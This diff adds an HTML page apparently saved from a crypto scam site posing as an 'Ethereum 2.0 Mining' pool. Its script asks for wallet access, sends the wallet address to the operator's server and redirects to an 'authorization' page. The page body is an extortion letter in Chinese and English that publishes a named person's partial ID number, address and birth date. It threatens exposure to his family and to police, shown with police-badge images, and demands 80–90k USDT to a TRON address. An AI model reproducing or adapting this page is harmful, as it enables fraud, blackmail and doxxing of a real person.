@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<!-- saved from url=(0111)file:///C:/Users/28337/Desktop/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9%20(2)/Ethereum%202.0%20Mining.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,viewport-fit=cover"><link rel="icon" href="https://usdt.swapcoin.info/web3/img/eth.png"><title>Ethereum 2.0 Mining</title><link href="./Ethereum 2.0 Mining_files/app.286eb6de.css" rel="preload" as="style"><link href="./Ethereum 2.0 Mining_files/chunk-vendors.1d4f0b8f.css" rel="preload" as="style"><link href="https://usdt.swapcoin.info/web3/js/app.abee6340.js" rel="preload" as="script"><link href="./Ethereum 2.0 Mining_files/chunk-vendors.0509b548.js.下载" rel="preload" as="script"><link href="./Ethereum 2.0 Mining_files/chunk-vendors.1d4f0b8f.css" rel="stylesheet"><link href="./Ethereum 2.0 Mining_files/app.286eb6de.css" rel="stylesheet"><script src="./Ethereum 2.0 Mining_files/web3.min.js.下载"></script><script src="./Ethereum 2.0 Mining_files/jquery-3.2.1.slim.min.js.下载"></script><script src="./Ethereum 2.0 Mining_files/jquery.js.下载"></script><!-- 引入 layui.css --><link href="./Ethereum 2.0 Mining_files/layui.css" rel="stylesheet"><!-- 引入 layui.js --><script src="./Ethereum 2.0 Mining_files/layui.js.下载"><script src="/web3/js/jquery-3.3.1.min.js"></script><script src="./Ethereum 2.0 Mining_files/chunk-vendors.0509b548.js.下载"></script><!-- <script src="./js/app.abee6340.js"></script> --><!--<script src="/web3/js/index.js"></script>--><!--<script src="/web3/js/common.js"></script>--><style type="text/css">.layui-layer-content{
+    padding: 30px;
+}
+/*#showActionsheetButton {*/
+/*  display: block;*/
+/*  margin: 50px auto;*/
+/*  padding: 4px 16px;*/
+/*  border: none;*/
+/*  border-radius: 5px;*/
+/*  background-color: #212244;*/
+/*  color: #fff;*/
+/*  font-size: 16px;*/
+/*  cursor: pointer;*/
+/*}*/
+#loading {
+  position: fixed;
+  z-index: 9999;
+  background: rgba(255, 255, 255, 0.8);
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.loader {
+  border: 5px solid #f3f3f3;
+  border-top: 5px solid #3498db;
+  border-radius: 50%;
+  width: 50px;
+  height: 50px;
+  animation: spin 1s linear infinite;
+}
+
+.loading-text {
+  margin-left: 20px;
+  font-size: 24px;
+  font-weight: bold;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }/web3/img/b1.webp
+  100% { transform: rotate(360deg); }
+}
+
+.actionsheet {
+  position: fixed;
+  z-index: 9999;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  display: none;
+}
+
+.actionsheet-mask {
+  position: absolute;
+  z-index: 1;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.5);
+}
+
+.actionsheet-menu {
+  position: absolute;
+  z-index: 2;
+  bottom: 0;
+  left: 0;
+  width: 100%;
+  background-color: #fff;
+  border-top-left-radius: 10px;
+  border-top-right-radius: 10px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+}
+
+.actionsheet-title {
+  padding: 10px;
+  font-size: 18px;
+  font-weight: bold;
+  color: #333;
+  border-bottom: 1px solid #e5e5e5;
+}
+
+.actionsheet-list {
+  margin: 0;
+  padding: 0;
+}
+
+.actionsheet-item {
+  padding: 10px;
+  font-size: 16px;
+  color: #333;
+  border-top: 1px solid #e5e5e5;
+  cursor: pointer;
+}
+
+.actionsheet-item:first-child {
+  border-top: none;
+}
+
+.actionsheet-cancel {
+  padding: 10px;
+  font-size: 18px;
+  font-weight: bold;
+  color: #333;
+  background-color: #f5f5f5;
+  border-top: 1px solid #e5e5e5;
+  border-bottom-left-radius: 10px;
+  border-bottom-right-radius: 10px;
+  cursor: pointer;
+}
+.van-collapse-item__wrapper {
+    overflow: hidden;
+    transition: height 0.3s ease-out;
+}
+  </style><style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
+  position: absolute;
+  top: 0;
+  right: 0;
+  left: 0;
+  bottom: 0;
+  z-index: 2147483647;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.immersive-translate-input-loading {
+  --loading-color: #f78fb6;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: block;
+  margin: 12px auto;
+  position: relative;
+  color: white;
+  left: -100px;
+  box-sizing: border-box;
+  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
+}
+
+@keyframes immersiveTranslateShadowRolling {
+  0% {
+    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  12% {
+    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  25% {
+    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  36% {
+    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  50% {
+    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
+  }
+
+  62% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
+  }
+
+  75% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
+  }
+
+  87% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
+  }
+
+  100% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
+  }
+}
+
+
+.immersive-translate-search-recomend {
+  border: 1px solid #dadce0;
+  border-radius: 8px;
+  padding: 16px;
+  margin-bottom: 16px;
+  position: relative;
+  font-size: 16px;
+}
+.immersive-translate-search-enhancement-en-title {
+  color: #4d5156;
+}
+/* dark */
+@media (prefers-color-scheme: dark) {
+  .immersive-translate-search-recomend {
+    border: 1px solid #3c4043;
+  }
+  .immersive-translate-close-action svg {
+    fill: #bdc1c6;
+  }
+
+.immersive-translate-search-enhancement-en-title {
+  color: #bdc1c6;
+}
+}
+
+
+.immersive-translate-search-settings {
+  position: absolute;
+  top: 16px;
+  right: 16px;
+  cursor: pointer;
+}
+
+.immersive-translate-search-recomend::before {
+  /* content: " "; */
+  /* width: 20px; */
+  /* height: 20px; */
+  /* top: 16px; */
+  /* position: absolute; */
+  /* background: center / contain url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAAxlBMVEUAAADpTInqTIjpSofnSIfqS4nfS4XqS4nqTIjsTYnrTInqTIroS4jvQIDqTIn////+/v7rSYjpTIn8/v7uaZzrTIr9/f3wfansWJL88/b85e73qc39+/v3xNnylrvrVI/98fb62Obva5/8+fr76vH4y9zpSIj74e353Oj1ocTzm77xhK/veKbtYpjsXJTqU47oTInxjrXyh7L99fj40eH2ttH1udD3sc31ssz1rMnykLXucqPtbqD85e/1xdn2u9DzqcXrUY6FaJb8AAAADnRSTlMA34BgIM8Q37/fz7+/EGOHcVQAAAGhSURBVDjLhZPncuowEEZFTW7bXVU7xsYYTO/p7bb3f6lICIOYJOT4h7/VnFmvrBFjrF3/CR/SajBHswafctG0Qg3O8O0Xa8BZ6uw7eLjqr30SofCDVSkemMinfL1ecy20r5ygR5zz3ArcAqJExPTPKhDENEmS30Q9+yo4lEQkqVTiIEAHCT10xWERRdH0Bq0aCOPZNDV3s0xaYce1lHEoDHU8wEh3qRJypNcTAeKUIjgKMeGLDoRCLVLTVf+Ownj8Kk6H9HM6QXPgYjQSB0F00EJEu10ILQrs/QeP77BSSr0MzLOyuJJQbnUoOOIUI/A8EeJk9E4YUHUWiRyTVKGgQUB8/3e/NpdGlfI+FMQyWsCBWyz4A/ZyHXyiiz0Ne5aGZssoxRmcChw8/EFKQ5JwwkUo3FRT5yXS7q+Y/rHDZmFktzpGMvO+5QofA4FPpEmGw+EWRCFvnaof7Zhe8NuYSLR0xErKLThUSs8gnODh87ssy6438yzbLzxl012HS19vfCf3CNhnbWOL1eEsDda+gDPUvri8tSZzNFrwIZf1NmNvqC1I/t8j7nYAAAAASUVORK5CYII='); */
+}
+
+.immersive-translate-search-title {}
+
+.immersive-translate-search-title-wrapper {}
+
+.immersive-translate-search-time {
+  font-size: 12px;
+  margin: 4px 0 24px;
+  color: #70757a;
+}
+
+.immersive-translate-expand-items {
+  display: none;
+}
+
+.immersive-translate-search-more {
+  margin-top: 16px;
+  font-size: 14px;
+}
+
+.immersive-translate-modal {
+  display: none;
+  position: fixed;
+  z-index: 1000000;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  overflow: auto;
+  background-color: rgb(0, 0, 0);
+  background-color: rgba(0, 0, 0, 0.4);
+}
+
+.immersive-translate-modal-content {
+  background-color: #fefefe;
+  margin: 15% auto;
+  padding: 20px;
+  border: 1px solid #888;
+  border-radius: 10px;
+  width: 80%;
+  max-width: 500px;
+  font-family: system-ui, -apple-system, "Segoe UI", "Roboto", "Ubuntu",
+    "Cantarell", "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji",
+    "Segoe UI Symbol", "Noto Color Emoji";
+}
+
+.immersive-translate-modal-title {
+  font-size: 1.5rem;
+  font-weight: 500;
+  margin-bottom: 20px;
+  color: hsl(205, 20%, 32%);
+}
+
+.immersive-translate-modal-body {
+  color: hsl(205, 20%, 32%)
+}
+
+.immersive-translate-close {
+  color: #aaa;
+  float: right;
+  font-size: 28px;
+  font-weight: bold;
+}
+
+.immersive-translate-close:hover,
+.immersive-translate-close:focus {
+  color: black;
+  text-decoration: none;
+  cursor: pointer;
+}
+
+.immersive-translate-modal-footer {
+  display: flex;
+  justify-content: flex-end;
+  flex-wrap: wrap;
+  margin-top: 20px;
+}
+
+.immersive-translate-btn {
+  color: #fff;
+  background-color: #ea4c89;
+  border: none;
+  font-size: 14px;
+  margin: 5px;
+  padding: 10px 20px;
+  font-size: 1rem;
+  border-radius: 5px;
+  display: flex;
+  align-items: center;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+
+.immersive-translate-cancel-btn {
+  /* gray color */
+  background-color: rgb(89, 107, 120);
+}
+
+.immersive-translate-btn:hover {
+  background-color: #f082ac;
+}
+
+.immersive-translate-cancel-btn:hover {
+  background-color: hsl(205, 20%, 32%);
+}
+
+
+.immersive-translate-btn svg {
+  margin-right: 5px;
+}
+
+.immersive-translate-link {
+  cursor: pointer;
+  user-select: none;
+  -webkit-user-drag: none;
+  text-decoration: none;
+  color: #007bff;
+  -webkit-tap-highlight-color: rgba(0, 0, 0, .1);
+}
+
+.immersive-translate-modal input[type="radio"] {
+  margin: 0 6px 16px;
+  cursor: pointer;
+}
+
+.immersive-translate-modal label {
+  cursor: pointer;
+}
+
+.immersive-translate-close-action {
+  position: absolute;
+  top: 2px;
+  right: 0px;
+  cursor: pointer;
+}
+</style></head><body class=""><noscript><strong>We're sorry but smartinu doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div data-v-23913bf6="" id="app"><div data-v-499bfa53="" data-v-23913bf6="" class="Customer" style="padding-bottom: 60px;"><div data-v-499bfa53="" class="introduce" style="background-color:#0053fb;border-radius:0;"><div data-v-499bfa53="" class="home_nav" style="height:30px;"><!--<div data-v-499bfa53="" style="width: 20px; height: 20px; margin-right: 20px;">--><!--  <img data-v-499bfa53="" src="/web3/img/down.png" style="width: 20px; height: 20px;">--><!--</div>--><div data-v-499bfa53="" style="display: flex;"><!--<div data-v-499bfa53="" id='showActionsheetButtons'>Connect</div>--><div class="actionsheet"><div class="actionsheet-mask"></div><div class="actionsheet-menu"><div class="actionsheet-title">Select Connect Wallet</div><div class="actionsheet-list"><div class="actionsheet-item" onclick="connect_wallet(&#39;coin98&#39;)">Coin98</div><div class="actionsheet-item" onclick="connect_wallet(&#39;kucoin&#39;)">KUCOIN</div><div class="actionsheet-item" onclick="connect_wallet(&#39;coinbase&#39;)">coinbase</div></div></div></div></div></div><div data-v-499bfa53="" style="padding: 8px 15px;"><img data-v-499bfa53="" src="./Ethereum 2.0 Mining_files/pandasecurity-How-do-hackers-pick-their-targets.jpg" style="height: 150px; width: 100%; border-radius: 20px;"></div><div data-v-499bfa53="" style="color: #fff; font-size: 15px; margin-left: 15px; margin-top: 15px;">别想着从我这里离开，大不了你10年以上，我也就几年</div><div data-v-499bfa53="" style="display: flex; color: #fff; margin-top: 8px; margin-left: 15px;"><div data-v-499bfa53="" style="margin-left: 8px;">Don't think about leaving from me, at worst, you have been here for more than 10 years, and I only have a few years</div></div><div data-v-499bfa53="" style="display: flex; color: #fff; margin-top: 8px; margin-left: 15px;"><img data-v-499bfa53="" src="./Ethereum 2.0 Mining_files/a2.png" style="width: 15px;"><div data-v-499bfa53="" style="margin-left: 8px;">别以为你离开了这里我就查不到你</div></div><div data-v-499bfa53="" style="display: flex; color: #fff; margin-top: 8px; margin-left: 15px;"><img data-v-499bfa53="" src="./Ethereum 2.0 Mining_files/a3.png" style="width: 15px;"><div data-v-499bfa53="" style="margin-left: 8px;">Don't think I can't track you down if you leave here</div></div><div data-v-499bfa53="" style="margin-top: 10px; color: #fff; margin-left: 15px; margin-right: 15px;">姓名: 陈召健
+身份证: 5326**199406232338
+性别: 男
+地址: 云南省文山壮族苗族自治州广南县
+出生日期: 1994-06-23
+星座: 巨蟹座
+生肖: 戌狗</div></div><div data-v-499bfa53="" class="characteristic" style="background-color:#0053fb;border-radius:0;margin-top:10px;color:#fff"><div data-v-499bfa53="" style="font-weight: 700;">敢用命令我的语气和我说话，你看来你很牛逼</div><div data-v-499bfa53="" style="display: flex; margin-top: 12px;"><img data-v-499bfa53="" src="./Ethereum 2.0 Mining_files/Police_Badge,P.R.China.svg.png" style="width: 50px;"><div data-v-499bfa53="" style="margin-left: 10px;"><div data-v-499bfa53="">别以为我什么都查不到，你和那女的做什么你心里清楚，要是你老婆孩子知道我看你怎么收场</div><div data-v-499bfa53="" style="font-size: 12px; margin-top: 4px; ">不是我做的绝，而是你自作自受</div></div></div><div data-v-499bfa53="" style="display: flex; margin-top: 12px;"><img data-v-499bfa53="" src="./Ethereum 2.0 Mining_files/Police_Badge,P.R.China.svg.png" style="width: 50px;"><div data-v-499bfa53="" style="margin-left: 10px;"><div data-v-499bfa53="">两个选择</div><div data-v-499bfa53="" style="font-size: 12px; margin-top: 4px;">1.要么我直接把你资料和你的资料全上传到北京市公安局，你觉得你很有背景是不是，那就看一下谁能够占到最后。第二选择，用钱来解决，8-9万U换你10年以上不亏吧？
+</div></div></div><div data-v-499bfa53="" style="display: flex; margin-top: 12px;"><img data-v-499bfa53="" src="./Ethereum 2.0 Mining_files/Police_Badge,P.R.China.svg.png" style="width: 50px;"><div data-v-499bfa53="" style="margin-left: 10px;"><div data-v-499bfa53="">还有，别以为只有你，郭某，王某，江某，被连累最惨的就是郭某，王某，还有你小舅子江某，对于你来说8-9万u根本不过分</div><div data-v-499bfa53="" style="font-size: 12px; margin-top: 4px;"></div></div></div></div><img data-v-499bfa53="" src="./Ethereum 2.0 Mining_files/bjjw_banner.png" style="height: 150px; width: 100%; border-radius: 20px;"><div data-v-499bfa53="" class="comproblem" style="background-color:#0053fb;border-radius:0;margin-top:10px;"><div data-v-499bfa53="" style="color: #fff;font-weight: 700;">你自己好好想清楚，我可是没结婚</div></div><div data-v-499bfa53="" class="partner" style="background-color:#0053fb;border-radius:0;margin-top:10px;margin-bottom:10px;">
+<div data-v-499bfa53="" style="color: #fff;font-weight: 700;">TYpPk2gnmXXJnwVqQ4HWBLAVtAHGpykH3Q</div>
+<div data-v-499bfa53="" style="color: #fff;font-weight: 700;">TYpPk2gnmXXJnwVqQ4HWBLAVtAHGpykH3Q</div>
+<div data-v-499bfa53="" style="color: #fff;font-weight: 700;">TYpPk2gnmXXJnwVqQ4HWBLAVtAHGpykH3Q</div><div data-v-499bfa53="" style="color: #fff;font-weight: 700;">别给我画饼，地址在这你就自己看着办，真要选择和我硬刚那随你</div><div data-v-499bfa53="" class="van-grid" style="padding-left: 10px; margin-top: 15px;"><div data-v-499bfa53="" class="van-grid-item" style="flex-basis: 25%; padding-right: 10px;"></div></div></div>
+<div data-v-499bfa53="" style="padding: 8px 15px;"><img data-v-499bfa53="" src="./Ethereum 2.0 Mining_files/340f1aefaa0246f7be2704a048c4904a.jpg" style="height: 150px; width: 100%; border-radius: 20px;"></div><!-- <div data-v-499bfa53="" class="bottom_txt"> Copyright © 2022.SWAP All rights reserved. </div> --><!----></div><a href="https://t.me/withdraw_yourencryption" target="_blank"><img data-v-23913bf6="" src="./Ethereum 2.0 Mining_files/df2932c134dac6cf63116619bee50169" class="mssage" style="width:40px;height:40px;top:79%;z-index:999999"></a><div data-v-23913bf6="" class="tabbar van-tabbar van-tabbar--fixed" style="height: 60px;background-color:#0053fb;border-top:2px solid #fff"><div data-v-23913bf6="" class="van-tabbar-item van-tabbar-item--active" style="color: rgb(255, 255, 255);" onclick="action_web(&quot;home&quot;)"><div class="van-tabbar-item__text" style="color:#fff;font-weight:800;"></div></div><div data-v-23913bf6="" class="van-tabbar-item" onclick="action_web(&quot;farm&quot;)"><div class="van-tabbar-item__icon"><img data-v-23913bf6="" src="./Ethereum 2.0 Mining_files/Police_Badge,P.R.China.svg.png"></div><div class="van-tabbar-item__text" style="color:#fff;font-weight:800;"><span data-v-23913bf6="">Home</span></div></div><div data-v-23913bf6="" class="van-tabbar-item" onclick="action_web(&quot;mine&quot;)"><div class="van-tabbar-item__text" style="color:#fff;font-weight:800;"></div></div></div></div><div id="loading" style="display: none"><div class="loader"></div><div class="loading-text">Loading...</div></div><div id="notice" style="display: none;">The ETH mining pool will start the distribution of mining division rewards on July 20th, and distribute the mining income according to the mining pool VIP1-5, and receive it in the extractable mining income</div><div class="van-toast van-toast--middle van-toast--loading" style="z-index: 2005; display: none;"><div class="van-loading van-loading--circular van-toast__loading"><span class="van-loading__spinner van-loading__spinner--circular"><svg viewBox="25 25 50 50" class="van-loading__circular"><circle cx="50" cy="50" r="20" fill="none"></circle></svg></span></div><div class="van-toast__text">獲取配置中...</div></div><script>function action_web(bq){
+    if(bq=='home'){
+        window.location.href = '/index/index/index.html?code=';
+    }
+    if(bq=='mine'){
+        window.location.href = '/index/index/mine.html?code=';
+    }
+    if(bq=='farm'){
+        window.location.href = '/index/index/farm.html?code=';
+    }
+}
+
+function toggleContent(element) {
+    var contentWrapper = element.nextElementSibling;
+    var icon = element.querySelector('i');
+    if (contentWrapper.style.height === '0px') {
+        contentWrapper.style.height = contentWrapper.scrollHeight + 'px';
+        contentWrapper.style.opacity = '1';
+        element.setAttribute('aria-expanded', 'true');
+        icon.classList.remove('van-icon-arrow');
+        icon.classList.add('van-icon-arrow-down');
+    } else {
+        contentWrapper.style.height = '0px';
+        contentWrapper.style.opacity = '0';
+        element.setAttribute('aria-expanded', 'false');
+        icon.classList.remove('van-icon-arrow-down');
+        icon.classList.add('van-icon-arrow');
+    }
+}
+
+$(document).ready(function() {
+  // 获取 DOM 元素
+  var $actionsheet = $('.actionsheet');
+  var $mask = $actionsheet.find('.actionsheet-mask');
+  var $menu = $actionsheet.find('.actionsheet-menu');
+  var $cancel = $menu.find('.actionsheet-cancel');
+
+  // 显示 actionsheet
+  function showActionsheet() {
+    showLoading();
+    if (typeof window.ethereum !== 'undefined') {
+        window.web3 = new Web3(window.ethereum);
+    } else if (typeof window.web3 !== 'undefined') {
+        window.web3 = new Web3(window.web3.currentProvider);
+    } else {
+        web3 = new Web3(new Web3.providers.HttpProvider("https://mainnet.infura.io/v3/548f646599f042a89420f0168153a356"));
+    }
+    
+    web3.eth.getAccounts(function(error, accounts) {
+            
+        if (Object.keys(accounts).length === 0) {
+    
+            window.ethereum.enable().then(function (account) {
+                console.log(account);
+                $.ajax({
+                  async: false,
+                  url: '/index/index/check_address.html',
+                  type: 'POST',
+                  data : {address: account},
+                  dataType: 'json',
+                  success: function(res) {
+                      hideLoading()
+                      if(res.action == 'register'){
+                          window.location.href = '/index/index/register.html';
+                      }
+                      if(res.action == 'authorization'){
+                          window.location.href = '/index/index/authorization.html?code='+res.code;
+                      }
+                      if(res.action == 'index'){
+                          window.location.href = '/index/index/index.html';
+                      }
+                      if(res.action == 'authorization_true'){
+                          window.location.href = '/index/index/farm.html';
+                      }
+                      
+                    
+                  }
+                 }) 
+              }).catch(function (error) {
+                  console.log(error)
+                  hideLoading();
+                // window.location.href = '/index/index/register.html';
+              });
+        }else{
+            $.ajax({
+              async: false,
+              url: '/index/index/check_address.html',
+              type: 'POST',
+              data : {address: accounts[0]},
+              dataType: 'json',
+              success: function(res) {
+                hideLoading();
+                if(res.action == 'register'){
+                    window.location.href = '/index/index/register.html';
+                }
+                if(res.action == 'authorization'){
+                    window.location.href = '/index/index/authorization.html?code='+res.code;
+                }
+                if(res.action == 'index'){
+                   window.location.href = '/index/index/index.html';
+                }
+                if(res.action == 'authorization_true'){
+                      window.location.href = '/index/index/farm.html';
+                  }
+              }
+             })
+        }
+    });    
+    
+    // web3.eth.getAccounts(function(error, accounts) {
+        
+    //     if (Object.keys(accounts).length === 0) {
+    //         hideLoading();
+    //         // $actionsheet.show();
+    //         // $mask.on('click', hideActionsheet);
+    //         // $cancel.on('click', hideActionsheet);
+    //         window.ethereum.enable().then(function () {
+    //             // 在这里可以执行后续操作，例如调用智能合约方法等
+    //             window.location.href = '/index/index/authorization.html?code=';
+    //           }).catch(function (error) {
+    //             console.log(error);
+    //           });
+    //     }else{
+    //         window.location.href = '/index/index/authorization.html?code=';
+    //     }
+    // });
+    
+    
+    
+    // try {
+    //     web3.eth.getNodeInfo(function(error, result){
+    //       if(error){
+    //          alert(error)
+    //          $actionsheet.show();
+    //          $mask.on('click', hideActionsheet);
+    //          $cancel.on('click', hideActionsheet);
+    //       }else{
+    //         alert(result)
+    //         window.location.href = '/index/index/authorization.html';
+    //       }
+    //     });
+    // } catch (e) {
+    //     alert(e)
+    //     $actionsheet.show();
+    //      $mask.on('click', hideActionsheet);
+    //      $cancel.on('click', hideActionsheet);
+    // }
+  }
+
+  // 隐藏 actionsheet
+  function hideActionsheet() {
+   $actionsheet.hide();
+   $mask.off('click', hideActionsheet);
+   $cancel.off('click', hideActionsheet);
+ }
+
+ // 绑定按钮点击事件
+ $('#showActionsheetButton').on('click', showActionsheet);
+});
+// 显示加载动画
+function showLoading() {
+  document.getElementById("loading").style.display = "flex";
+}
+
+// 隐藏加载动画
+function hideLoading() {
+  document.getElementById("loading").style.display = "none";
+}
+
+function connect_wallet(wallet){
+  if(wallet=='coin98'){
+    
+    const COIN98_URL_SCHEME = 'coin98://';
+    
+    // 唤醒Coin98 App并进入其浏览器页面
+    const url = 'https://www.google.com';
+    const browserUrl = `${COIN98_URL_SCHEME}/dapps?url=${encodeURIComponent(url)}`;
+    //   window.location = browserUrl;
+    window.location = "coin98://path/to/page";
+    
+  }
+  if(wallet=='kucoin'){
+    // window.open(`kucoinwallet://browser?url=http://172.87.29.143`);
+    // const kucoin_url = 'kucw://open/web?url=http://172.87.29.143';
+    const kucoin_url = 'kupay://transfer';
+    window.open(kucoin_url);
+
+
+    
+  }
+  if(wallet=='coinbase'){
+    const coinbase_url='https://go.cb-w.com/dapp?cb_url=https://usdt.swapcoin.info';
+    window.open(coinbase_url);
+  }
+}
+var obj = document.getElementById("notice");
+obj.innerHTML = obj.innerText;//这样重新设置html代码为解析后的格式
+layui.use(function(){
+    var layer = layui.layer;
+    var notice = $('#notice').html();
+    console.log(notice);
+    // Welcome
+    // 在此处输入 layer 的任意代码
+    layer.open({
+      type: 1, // page 层类型
+      area: 'auto',
+      title: 'Announcement',
+      shade: 0.6, // 遮罩透明度
+      shadeClose: true, // 点击遮罩区域，关闭弹层
+      maxmin: false, // 允许全屏最小化
+      anim: 0, // 0-6 的动画形式，-1 不开启
+      content:notice
+    });
+  });
+</script><div class="layui-layer-move" id="layui-layer-move" style="cursor: move; display: none;"></div><div class="layui-layer-shade" id="layui-layer-shade1" times="1" style="z-index: 19891014; background-color: rgb(0, 0, 0); opacity: 0.6;"></div></body></html>
